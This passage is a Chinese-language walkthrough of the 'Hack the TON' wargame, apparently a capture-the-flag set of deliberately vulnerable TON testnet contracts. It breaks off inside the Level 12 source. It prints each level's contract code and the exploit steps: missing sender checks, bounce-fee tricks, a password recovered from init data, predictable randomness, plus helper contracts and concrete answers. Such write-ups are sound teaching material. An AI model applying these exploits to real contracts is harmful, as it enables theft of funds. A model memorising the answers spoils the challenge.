---
title: Hack the TON
tags:
    - blockchain
    - smart contract
    - ton
    - tact
    - tolk
    - func
    - fift
---

## 0. INTRODUCTION

- 可以在控制台中使用 `help()` 查看可以使用的程序功能

    (index) | description
    -|-
    fromNano(nano)|"convert nano units to ton"
    toNano(ton)|"convert ton units to nano"
    contract|"current level contract instance (if created)"
    player|"current player (if wallet connected)"
    Address.parse(addressString)|"parse Address from string"
    tonConnectUI.sendTransaction(tx, options)|"send custom transaction to arbitrary address"
    beginCell()|"start building a cell"

- 在连接钱包后，点击 `GET NEW INSTANCE` 获取一个题目实例
- 与 Ethernaut 类似，可以在控制台使用 `contract` 获取信息或与合约交互

    ```js
    > await contract.getInfo() 
    ​You will find what you need in getInfo1().
    > await contract.getInfo1() 
    ​Try getInfo2(), but with 'hello' as a parameter. 
    ​> await contract.getInfo2("hello") 
    ​Try getInfoNum() to know the number of the next info method to call. 
    ​> await contract.getInfoNum() 
    ​42n​
    > await contract.getInfo42() 
    ​Send message Authenticate if you know the password.
    > await contract.getPassword() 
    ​Tact and FunC for the win!
    > await contract.send(player, {value: toNano(0.05)}, {$$type: "Authenticate", password: "Tact and FunC for the win!"});
    ```

- 完成后点击 `CHECK SOLUTION` 验证

### References

- [Send messages to contracts](https://docs.tact-lang.org/book/debug/#tests-send)

## 1. DEPOSIT

> You will beat this level if:

> - Claim ownership of the contract

> - Reduce its balance to 0

??? note "DepositLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    contract DepositLevel with Ownable, Deployable {
        owner: Address;
        player: Address;
        nonce: Int;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;
        }

        receive() {
            require(context().value >= ton("0.01"), "Not enough TON.");
            self.owner = sender();
        }

        receive("withdraw") {
            self.requireOwner();
            send(SendParameters{
                to: sender(),
                bounce: true,
                value: 0,
                mode: SendRemainingBalance + SendIgnoreErrors
            });
        }

        receive("check") {
            let ctx: Context = context();
            send(SendParameters{
                to: ctx.sender,
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "deposit",
                    completed: (myBalance() - ctx.value) == 0 && self.owner == self.player,
                }.toCell()
            });
        }

        get fun balance(): String {
            return myBalance().toCoinsString();
        }
    }
    ```

- 只有所有者才能取出合约持有的 TON，首先向合约发送 TON 以成为所有者

    ```js
    > await player.send({to: contract.address.toString(), value: toNano("0.05")});
    // or
    > await contract.send(player, {value: toNano(0.05)}, null);
    ```

- 使用 `withdraw` 取出合约中所有的资金

    ```js
    > await contract.send(player, {value: toNano(0.05)}, "withdraw"); 
    ```

## 2. SCANNER

> Claim ownership of the contract below to complete this level.

??? note "ScannerLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    contract Child with Deployable {
        parent: Address;
        nonce: Int;

        init(parent: Address, nonce: Int) {
            self.parent = parent;
            self.nonce = nonce;
        }
    }

    message SendChildAddress {
        address: Address;
    }

    contract ScannerLevel with Ownable, Deployable {
        owner: Address;
        player: Address;
        nonce: Int;
        child: Address;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Child(myAddress(), nonce);
            self.child = contractAddress(level_init);
            send(SendParameters{
                to: self.child,
                value: ton("0.01"),
                mode: SendPayGasSeparately,
                bounce: false,
                data: level_init.data,
                code: level_init.code,
                body: Deploy {
                    queryId: 0,
                }.toCell()
            });
        }

        receive(msg: SendChildAddress) {
            require(msg.address == self.child, "Wrong child address.");
            self.owner = sender();
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "scanner",
                    completed: self.owner == self.player
                }.toCell()
            });
        }
    }
    ```

- 要成为合约的所有者需要知道 `Child` 合约的地址，可以通过 [Tonviewer](https://testnet.tonviewer.com/) 查看 `ScannerLevel` 部署的交易来获知
- 发送 `Child` 合约地址

    ```js
    > await contract.send(player, {value: toNano("0.05")}, {$$type: "SendChildAddress", address: Address.parse("kQDjT2mQ8ePcmYsBMQDi4JJHPzZNU1nqe_KbqIOwUKZaCX2Z")});
    ```

## 3. BOUNCE

> Claim ownership of the contract below to complete this level.

??? note "BounceLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    message Start {
        time: Int as uint32;
    }

    message Finish {
        time: Int as uint32;
    }

    contract Timer with Deployable {
        parent: Address;
        nonce: Int;
        startTime: Int? as uint32;

        init(parent: Address, nonce: Int) {
            self.parent = parent;
            self.nonce = nonce;
        }

        receive(msg: Start) {
            self.startTime = msg.time;
        }

        receive(msg: Finish) {
            if (self.startTime == null) {
                return;
            }

            require(msg.time - self.startTime!! < 180, "Too late.");
            self.startTime = null;
        }
    }

    contract BounceLevel with Ownable, Deployable {
        owner: Address;
        player: Address;
        nonce: Int;
        timer: Address;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Timer(myAddress(), nonce);
            self.timer = contractAddress(level_init);
            send(SendParameters{
                to: self.timer,
                value: ton("0.01"),
                bounce: false,
                data: level_init.data,
                code: level_init.code
            });
        }

        receive("start") {
            send(SendParameters{
                to: self.timer,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: Start{
                    time: now()
                }.toCell()
            });
        }

        receive("finish") {
            send(SendParameters{
                to: self.timer,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: Finish{
                    time: now()
                }.toCell()
            });
        }

        bounced(_: Slice) {
            self.owner = self.player;
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "bounce",
                    completed: self.owner == self.player
                }.toCell()
            });
        }
    }
    ```

- 合约 `BounceLevel` 收到弹回的消息后就会将玩家设为合约所有者
- 只需要在发送完 `start` 的三分钟后向 `BounceLevel` 发送 `finish`，让合约 `Timer` 抛出错误弹回消息即可
    - 或直接向 `Timer` 发送 `start` 设置自定义开始时间

    ```js
    > await contract.send(player, {value: toNano('0.05')}, "start");
    // or
    > await player.send({to: Address.parse("kQCmY8KG3F2y-2Unxl2jMtJMIUjT9fWhqXWM37hPHWbnPIjp"), value: toNano("0.01"), body: beginCell().storeUint(1141136470, 32).storeUint(0, 32).endCell()});
    // opcode: sha256("Start{time:uint32}") >> 224

    > await contract.send(player, {value: toNano('0.05')}, "finish"); 
    ```

### References

- [tact-lang / tact](https://github.com/tact-lang/tact/blob/ecae8d73c2cafef31c3c2ffebf1c69a5a89cb506/src/types/resolveSignatures.ts#L283-L291)

## 4. INTRUDER

> Claim ownership of the contract below to complete this level.

??? note "IntruderLevel"

    ```js
    import "@stdlib/deploy";
    import "./messages";

    message(0x6e38a063) ChangeLevelOwner {
        newOwner: Address;
    }

    message(0x6f13c225) ChangeClientOwner {
        newOwner: Address;
    }

    message(0xa4e501ef) ChangeOwnerInternal {
        newOwner: Address;
    }

    contract Manager with Deployable {
        client: Address;
        nonce: Int;

        init(client: Address, nonce: Int) {
            self.client = client;
            self.nonce = nonce;
        }

        receive(msg: ChangeClientOwner) {
            send(SendParameters{
                to: self.client,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: ChangeOwnerInternal{
                    newOwner: msg.newOwner
                }.toCell()
            });
        }
    }

    contract IntruderLevel with Deployable {
        owner: Address;
        player: Address;
        nonce: Int;
        manager: Address;

        init(player: Address, nonce: Int) {
            self.owner = sender();
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Manager(myAddress(), nonce);
            self.manager = contractAddress(level_init);
            send(SendParameters{
                to: self.manager,
                value: ton("0.01"),
                bounce: false,
                data: level_init.data,
                code: level_init.code
            });
        }

        receive(msg: ChangeLevelOwner) {
            require(sender() == self.owner, "Wrong sender.");
            send(SendParameters{
                to: self.manager,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: ChangeClientOwner{
                    newOwner: msg.newOwner
                }.toCell()
            });
        }

        receive(msg: ChangeOwnerInternal) {
            require(sender() == self.manager, "Wrong sender.");
            self.owner = msg.newOwner;
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "intruder",
                    completed: self.owner == self.player
                }.toCell()
            });
        }

        get fun owner(): Address {
            return self.owner;
        }
    }
    ```

- 只有 `manager` 能设置合约的所有者，而初始 `manager` 为 `Manager` 合约
- 合约 `Manager` 不检查 `ChangeClientOwner` 消息的发送者

    ```js
    message(0x6f13c225) ChangeClientOwner {
        newOwner: Address;
    }
    ```

- 可以向 `Manager` 合约发送 `ChangeClientOwner` 消息来设置 `IntruderLevel` 合约的所有者

    ```js
    > await player.send({to: Address.parse("kQCi5Sne638i1fdoGMK7cnKPVuQWgyGO4N4LxneLonWwvgZ_"), value: toNano("0.01"), body: beginCell().storeUint(0x6f13c225, 32).storeAddress(player.address).endCell()});
    ```

## 5. PARTIAL

> The goal of this level is to hack the vault contract below.
> 
> You are given 100 tokens to start with and you will beat the level if you manage to acquire 1000 or more.

??? note "PartialLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "./messages";

    message DepositToVault {
        amount: Int as coins;
    }

    message WithdrawFromVault {
        amount: Int as coins;
    }

    message DepositInternal {
        amount: Int as coins;
    }

    message WithdrawInternal {
        amount: Int as coins;
    }

    contract Vault with Ownable, Deployable {
        owner: Address;
        nonce: Int;
        balance: Int as coins = 500;

        init(owner: Address, nonce: Int) {
            self.owner = owner;
            self.nonce = nonce;
        }

        receive(msg: DepositInternal) {
            self.requireOwner();
            self.balance += msg.amount;
        }

        receive(msg: WithdrawInternal) {
            self.requireOwner();
            require(self.balance >= msg.amount, "Not enough balance.");
            self.balance -= msg.amount;
        }

        get fun balance(): Int {
            return self.balance;
        }
    }

    contract PartialLevel with Deployable {
        player: Address;
        nonce: Int;
        vault: Address;
        balance: Int as coins = 100;

        init(player: Address, nonce: Int) {
            self.player = player;
            self.nonce = nonce;

            let level_init: StateInit = initOf Vault(myAddress(), nonce);
            self.vault = contractAddress(level_init);
            send(SendParameters{
                to: self.vault,
                value: ton("0.01"),
                bounce: false,
                data: level_init.data,
                code: level_init.code
            });
        }

        receive(msg: DepositToVault) {
            require(self.balance >= msg.amount, "Not enough balance.");
            self.balance -= msg.amount;
            send(SendParameters{
                to: self.vault,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: DepositInternal{
                    amount: msg.amount
                }.toCell()
            });
        }

        receive(msg: WithdrawFromVault) {
            self.balance += msg.amount;
            send(SendParameters{
                to: self.vault,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: WithdrawInternal{
                    amount: msg.amount
                }.toCell()
            });
        }

        bounced(msg: WithdrawInternal) {
            self.balance -= msg.amount;
        }

        receive("check") {
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "partial",
                    completed: self.balance >= 1000
                }.toCell()
            });
        }

        get fun balance(): Int {
            return self.balance;
        }
    }
    ```

- 通过 `WithdrawFromVault` 可以增加合约的余额，但若 `WithdrawInternal` 执行失败，将回弹消息并回滚余额

    ```js
    contract Vault with Ownable, Deployable {
        // [...]

        receive(msg: WithdrawInternal) {
            self.requireOwner();
            require(self.balance >= msg.amount, "Not enough balance.");
            self.balance -= msg.amount;
        }

        // [...]
    }

    contract PartialLevel with Deployable {
        // [...]

        receive(msg: WithdrawFromVault) {
            self.balance += msg.amount;
            send(SendParameters{
                to: self.vault,
                value: 0,
                bounce: true,
                mode: SendRemainingValue,
                body: WithdrawInternal{
                    amount: msg.amount
                }.toCell()
            });
        }

        bounced(msg: WithdrawInternal) {
            self.balance -= msg.amount;
        }

        // [...]
    }
    ```

- 在 TON 中， 如果支付的费用不足以完成执行，则不会创建回弹消息。因此只需要支付仅供 `WithdrawFromVault` 执行的费用，使余额增加即可

    ```js
    > await contract.send(player, {value: toNano("0.005")}, {$$type: "WithdrawFromVault", amount: 900});
    // https://testnet.tonviewer.com/transaction/407df39b95d852f44d1b1a9b8176bc68a44701bc2afabd7b069110faba553a5f
    ```

### References

- [Internal message](https://docs.ton.org/v3/documentation/smart-contracts/transaction-fees/accept-message-effects#internal-message)

## 6. PEEK

> Unlock the contract below to complete this level.

??? note "PeekLevel"

    ```js
    import "@stdlib/deploy";
    import "../messages";
    message Unlock {
        password: Int as uint32;
    }

    contract PeekLevel with Deployable {
        player: Address;
        nonce: Int;
        password: Int as uint32;
        locked: Bool = true;
        init(player: Address, nonce: Int, password: Int){
            self.player = player;
            self.nonce = nonce;
            self.password = password;
        }

        receive(msg: Unlock){
            require(msg.password == self.password, "Wrong password.");
            self.locked = false;
        }

        receive("check"){
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{name: "peek", completed: !self.locked}.toCell()
            }
            );
        }

        get fun locked(): Bool {
            return self.locked;
        }
    }
    ```

- 提供正确的密码即可解锁，需要解析[初始化消息](https://testnet.tonviewer.com/transaction/fbeffd0aceed689c0da7bf2ed2c5544b541f2b8c00e57c49a06616d123ede22f)
- 部署 Tact 编写的合约，函数 `init()` 的参数包含在 init data 中，并将在部署附带的第一次合约调用中根据 init data 更新存储
- 使用 `pytoniq-core` 解析初始数据
    - 尽管可以使用较小的 `Int` 表示形式来减少存储开销，但 TVM 仅对 257 位整型进行操作。因此，init data 中的整型参数均为 257 位有符号整数

    ```py
    from pytoniq_core import Cell, Slice

    init = Cell.one_from_boc('b5ee9c720102120100034600020134040101c340007a7155b50ef485eb69331e4e6a963457a71a0d34a960e74e38724741ddb27b00000000000000000000000000000000000000000000000000000000000000005800000000000000000000000000000000000000000000000000000000abad86ee020101c0030105a1a75f040114ff00f4a413f4bcf2c80b05020162060702ead001d0d3030171b0a301fa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088545053036f04f86102f862db3c5513db3cf2e082c8f84301cc7f01ca005530504320d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088cf16810101cf0012cb1fca00c9ed540f080201200d0e02eeeda2edfb0192307fe07021d749c21f953020d70b1fde2082102194da8eba8e1c30d31f0182102194da8ebaf2e081d31f0131816dde3222baf2f4707fe0208210946a98b6ba8ea830d31f018210946a98b6baf2e081d33f0131c8018210aff90f5758cb1fcb3fc9f84201706ddb3c7fe0c0009130e30d70090a013a6d6d226eb3995b206ef2d0806f22019132e2102470030480425023db3c0b01aef90182f0b92ab1b3504a092e6e10b90beb85a7ceb990452ba73c09375bf2dd2a56cbcf7fba8eaff842708040708b47065656b825c000c85982106df37b4d5003cb1fc858cf16c901ccca00c91443306d6ddb3c7fdb31e00b01cac87101ca01500701ca007001ca02500520d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088cf165003fa027001ca68236eb3917f93246eb3e2973333017001ca00e30d216eb39c7f01ca0001206ef2d08001cc95317001ca00e2c901fb000c00987f01ca00c87001ca007001ca00246eb39d7f01ca0004206ef2d0805004cc9634037001ca00e2246eb39d7f01ca0004206ef2d0805004cc9634037001ca00e27001ca00027f01ca0002c958cc0211becdbed9e6d9e3620c0f100011be15f76a268690000c01eced44d0d401f863d200018e2dfa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e08801810101d700d31fd20055306c14e0f828d70b0a8309baf2e089fa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e08801810101d700810101d700552003d158db3c1100022000027f')
    init_slice = init.begin_parse()
    init_slice.load_ref()   # skip init code
    init_data = init_slice.load_ref()
    data_slice = init_data.begin_parse()
    data_slice.load_ref()   # skip tact context system
    data_slice.load_int(1)  # skip init status
    data_slice.load_address()   # player
    data_slice.load_int(257)    # nonce
    print(data_slice.load_int(257)) # password
    ```

- 发送解锁消息

    ```js
    > await contract.send(player, {value: toNano("0.005")}, {$$type: "Unlock", password: 720069051}); 
    ```

### References

- [yungwine / pytoniq-core](https://github.com/yungwine/pytoniq-core/blob/22c0359b79408b9048f930f59b10ddfdd904edab/examples/boc/boc.py)
- [Serialization](https://docs.tact-lang.org/book/integers/#serialization)

## 7. SWAP

> You will beat the level if you manage to acquire tokens amount equivalent to 1000 TON or more.

??? note "SwapLevel"

    ```js
    import "@stdlib/ownable";
    import "@stdlib/deploy";
    import "../messages";
    message SwapTonToTokens {
        amount: Int as coins;
    }
    message RequestBalance {
        sender: Address;
    }
    message ResponseBalance {
        sender: Address;
        balance: Int as coins;
    }

    contract Token with Ownable, Deployable {
        owner: Address;
        nonce: Int;
        balance: Int as coins = 0;
        init(owner: Address, nonce: Int){
            self.owner = owner;
            self.nonce = nonce;
        }

        receive(msg: SwapTonToTokens){
            self.requireOwner();
            self.balance += msg.amount;
            send(SendParameters{
                to: sender(),
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: "send ton".asComment()
            }
            );
        }

        receive("swap tokens to ton"){
            self.requireOwner();
            self.balance = 0;
            send(SendParameters{
                to: sender(),
                bounce: true,
                value: 0,
                mode: SendRemainingBalance + SendIgnoreErrors
            }
            );
        }

        receive(msg: RequestBalance){
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: ResponseBalance{
                sender: msg.sender,
                balance: self.balance
                }.toCell()
            }
            );
        }

        get fun balance(): Int {
            return self.balance;
        }
    }

    contract SwapLevel with Deployable {
        player: Address;
        nonce: Int;
        token: Address;
        init(player: Address, nonce: Int){
            self.player = player;
            self.nonce = nonce;
            let token_init: StateInit = initOf Token(myAddress(), nonce);
            self.token = contractAddress(token_init);
            send(SendParameters{
                to: self.token,
                value: ton("0.01"),
                bounce: false,
                data: token_init.data,
                code: token_init.code
            }
            );
        }

        receive(){}

        receive("swap ton to tokens"){
            send(SendParameters{
                to: self.token,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: SwapTonToTokens{amount: myBalance() - context().value}.toCell()
            });
        }

        receive("swap tokens to ton"){
            send(SendParameters{
                to: self.token,
                value: 0,
                bounce: false,
                mode: SendRemainingValue,
                body: "swap tokens to ton".asComment()
            }
            );
        }

        receive("send ton"){
            require(sender() == self.token, "Wrong sender.");
            send(SendParameters{
                to: self.token,
                bounce: true,
                value: 0,
                mode: SendRemainingBalance + SendIgnoreErrors
            }
            );
        }

        receive("withdraw"){
            send(SendParameters{
                to: self.player,
                bounce: true,
                value: 0,
                mode: SendRemainingBalance + SendIgnoreErrors
            }
            );
        }

        receive("check"){
            send(SendParameters{
                to: self.token,
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: RequestBalance{sender: sender()}.toCell()
            }
            );
        }

        receive(msg: ResponseBalance){
            require(sender() == self.token, "Wrong sender.");
            send(SendParameters{
                to: msg.sender,
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                    name: "swap",
                    completed: msg.balance >= ton("1000")
                }.toCell()
            }
            );
        }
    }
    ```

- 操作 `swap ton to tokens` 每次能使 `Token` 的 `balance` 增加 `myBalance() - context().value`，即合约 `SwapLevel` 持有的 TON 越多，每次的增加量越大。向合约 `SwapLevel` 发送 TON 增加其余额以减少操作的次数

    ```js
    await contract.send(player, {value: toNano("4")}, null);
    ```

- 合约 `Token` 执行操作 `SwapTonToTokens` 时，会向合约 `SwapLevel` 发送 `send ton` 消息，使其将所持有的全部 TON 发送给合约 `Token`。需要控制 `swap ton to tokens` 消息附带的 TON，使合约 `SwapLevel` 无法将余额发送给合约 `Token`。经测试，可以使用 0.008 TON

    ```js
    > await contract.send(player, {value: toNano("0.008")}, "swap ton to tokens");
    ```

- 使用 [TON Web IDE](https://ide.ton.org/) 部署[辅助合约](https://testnet.tonviewer.com/kQD_0bgEFD_LSF-_g5jrmlSyOsz-j2iLKY49OSMKOMYH-Zk-)，批量发送消息
    - 全局设置中可以修改消息附带的 TON 数量

    ```js
    import "@stdlib/deploy";

    message Swap {
        cnt: Int as uint32;
        target: Address;
    }

    contract MultiMessageSender with Deployable {
        // example args: {cnt: 1000, value: 1 TON}
        receive(msg: Swap) {
            repeat(msg.cnt) {
                send(SendParameters{
                    to: msg.target,
                    value: ton("0.008"),
                    mode: SendDefaultMode + SendPayGasSeparately,
                    body: "swap ton to tokens".asComment()
                });
            }
        }
    }
    ```

- 检查结束后取回合约中的 TON

    ```js
    > await contract.send(player, {value: toNano("0.008")}, "swap tokens to ton");
    > await contract.send(player, {value: toNano("0.005")}, "withdraw");
    ```

## 8. COIN

> To complete the level, guess 10 times in a row which side the coin will land on.

??? note "CoinLevel"

    ```js
    import "@stdlib/deploy";
    import "../messages";
    message Flip {
        side: Bool;
    }

    contract Contract {
        nonce: Int;
        init(nonce: Int){
            self.nonce = nonce;
        }
    }

    contract CoinLevel with Deployable {
        player: Address;
        nonce: Int;
        consecutiveWins: Int = 0;
        flipsCount: Int = 0;
        init(player: Address, nonce: Int){
            self.player = player;
            self.nonce = nonce;
        }

        receive(msg: Flip){
            let init: StateInit = initOf Contract(self.flipsCount);
            let contractAddress: Address = contractAddress(init);
            let side = contractAddress.asSlice().asCell().hash() % 2 == 0;
            self.consecutiveWins = msg.side == side ? self.consecutiveWins + 1 : 0;
            self.flipsCount += 1;
        }

        receive("check"){
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                name: "coin",
                completed: self.consecutiveWins >= 10
                }.toCell()
            }
            );
        }

        get fun consecutiveWins(): Int {
            return self.consecutiveWins;
        }

        get fun flipsCount(): Int {
            return self.flipsCount;
        }
    }
    ```

- 需要连续猜对 10 次，借助辅助合约预测结果并发送消息
    - 题目合约使用的 Tact 编译器版本为 1.4.4。不同编译器版本可能产生不同的编译结果，最好**使用相同版本的编译器**，保证 `initOf` 在辅助合约中的计算结果与实例合约相同

    ```js
    import "@stdlib/deploy";

    message Flip {
        side: Bool;
    }
    message Guess {
        cnt: Int as uint32;
        start: Int as uint32;
        target: Address;
    }

    contract Contract {
        nonce: Int;
        init(nonce: Int){
            self.nonce = nonce;
        }
    }

    contract Guesser with Deployable {

        receive(msg: Guess) {
            let p: Int = msg.start;
            while(p < msg.start + msg.cnt) {
                let init: StateInit = initOf Contract(p);
                let contractAddress: Address = contractAddress(init);
                let side: Bool = contractAddress.asSlice().asCell().hash() % 2 == 0;
                send(SendParameters{
                    to: msg.target,
                    value: ton("0.01"),
                    mode: SendDefaultMode + SendPayGasSeparately,
                    body: Flip{
                        side: side
                    }.toCell()
                });
                p += 1;
            }
        }
    }
    ```

## 9. GATEKEEPER

> Unlock the contract below to complete this level.

??? note "GatekeeperLevel"

    ```js
    import "@stdlib/deploy";
    import "../messages";
    message Unlock {
        a: Int;
        b: Int;
    }

    contract GatekeeperLevel with Deployable {
        player: Address;
        nonce: Int;
        locked: Bool = true;
        init(player: Address, nonce: Int){
            self.player = player;
            self.nonce = nonce;
        }

        receive(msg: Unlock){
            require((sender().asSlice().asCell().hash() ^ ((msg.a << 2) + msg.b)) ==
                myAddress().asSlice().asCell().hash(),
            "Check failed."
            );
            self.locked = false;
        }

        receive("check"){
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                name: "gatekeeper",
                completed: !self.locked
                }.toCell()
            }
            );
        }

        get fun locked(): Bool {
            return self.locked;
        }
    }
    ```

- 解锁需要 `sender().asSlice().asCell().hash() ^ ((msg.a << 2) + msg.b)` 的值与 `myAddress().asSlice().asCell().hash()` 相等
- 获取实例地址的哈希值

    ```js
    > beginCell().storeAddress(contract.address).endCell().hash().toHex()
    3036979211fd86c13a1113af157f701ea19eafb8e1d1c36d761c5ff41c99bc80
    ```

- 由于 `a` 和 `b` 没有限制范围，可以直接将 `a` 设置为 0，`b` 为发送者地址哈希值与实例地址哈希值异或的结果

    ```js
    > await contract.send(player, {value: toNano('0.01')}, {$$type: 'Unlock', a: 0n, b: 86130810477776835231294161513457632144148633294017539526014373747458502429745n});
    ```

## 10. BRUTE-FORCE

> Unlock the contract below to complete this level.

??? note "BruteforceLevel"

    ```js
    import "@stdlib/deploy";
    import "../messages";
    message Unlock {
        a: Int;
        b: Int;
        c: Int;
        d: Int;
    }

    contract BruteforceLevel with Deployable {
        player: Address;
        nonce: Int;
        locked: Bool = true;
        x: Int as uint8 = 0;
        y: Int as uint8 = 0;
        init(player: Address, nonce: Int){
            self.player = player;
            self.nonce = nonce;
        }

        receive(msg: Unlock){
            self.x = msg.a + msg.c;
            self.y = msg.b + msg.d;
            require((self.x + self.y) == 2, "First check failed.");
            require((((pow(msg.a, 25) +
                pow(msg.b, 25)) +
                pow(msg.c, 25)) +
                pow(msg.d, 25)) ==
                1968172103452999492963878188028555943794336458502883276710491621054698698752,
            "Second check failed."
            );
            self.locked = false;
        }

        receive("check"){
            send(SendParameters{
                to: sender(),
                value: 0,
                mode: SendRemainingValue,
                bounce: false,
                body: CheckLevelResult{
                name: "bruteforce",
                completed: !self.locked
                }.toCell()
            }
            );
        }

        get fun locked(): Bool {
            return self.locked;
        }
    }
    ```

- 解锁需要提供满足特定条件的四个整数
    - `(self.x + self.y) == 2` 即 `msg.a + msg.b + msg.c + msg.d == 2`，说明正负整数的绝对值之差为 2，且 `msg.a + msg.c` 和 `msg.b + msg.d` 的结果在 8 位无符号整型的范围内
    - `(((pow(msg.a, 25) + pow(msg.b, 25)) + pow(msg.c, 25)) + pow(msg.d, 25))` 的结果是一个正整数 `1968172103452999492963878188028555943794336458502883276710491621054698698752`
- 由此推测出两种可能的情况
    - `self.x` 为 2，`self.y` 为 0（反之亦同）
    - `self.x` 和 `self.y` 同为 1

    ```py
    t = 1968172103452999492963878188028555943794336458502883276710491621054698698752
    for a in range(2, 3000):
        c = - (a - 2)
        r = pow(a, 25) + pow(c, 25)
        if r == t:
            print(a, c)
            break
        if r > t:
            break
    for a in range(1, 3000):
        for b in range(1, 3000):
            c, d = - (a - 1), - (b - 1)
            r = pow(a, 25) + pow(b, 25) + pow(c, 25) + pow(d, 25)
            if r == t:
                print(a, b, c, d)
                break
        else:
            continue
        break
    ```

- 发送结果到实例合约

    ```js
    > await contract.send(player, {value: toNano('0.01')}, {$$type: 'Unlock', a: 850, b: 1200, c: -849, d: -1199});
    ```

## 11. TOLK

> Unlock the contract below to complete this level.

??? note "Tolk"

    ```
    const OP_UNLOCK = "op::unlock"c; // create an opcode from string using the "c" prefix, this results in 0xf0fd50bb opcode in this case

    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;
    global ctxLocked: bool;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);
        ctxLocked = ds.loadBool();

        ds.assertEndOfSlice();
    }

    // saveData stores storage variables as a cell into persistent storage
    fun saveData() {
        setContractData(
            beginCell()
                .storeSlice(ctxPlayer)
                .storeUint(ctxNonce, 32)
                .storeBool(ctxLocked)
            .endCell()
        );
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        val flags: int = cs.loadUint(4);
        if (flags & 1) { // ignore all bounced messages
            return;
        }
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op

        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("tolk").endCell())
                .storeBool(!ctxLocked)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (op == OP_UNLOCK) {
            ctxLocked = false;
            saveData();
            return;
        }

        throw 0xffff; // if the message contains an op that is not known to this contract, we throw
    }

    // get methods are a means to conveniently read contract data using, for example, HTTP APIs
    // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    get locked(): bool {
        loadData();
        return ctxLocked;
    }
    ```

发送 `OP_UNLOCK` 对应的操作码即可解锁。

```js
> await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano('0.005'));
```

## 12. UPGRADE

> Unlock the contract below to complete this level.

??? note "Upgrade"

    ```
    const OP_UPGRADE = "op::upgrade"c; // create an opcode from string using the "c" prefix, this results in 0xdbfaf817 opcode in this case

    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;
    global ctxLocked: bool;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);
        ctxLocked = ds.loadBool();

        ds.assertEndOfSlice();
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        val flags: int = cs.loadUint(4);
        if (flags & 1) { // ignore all bounced messages
            return;
        }
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op

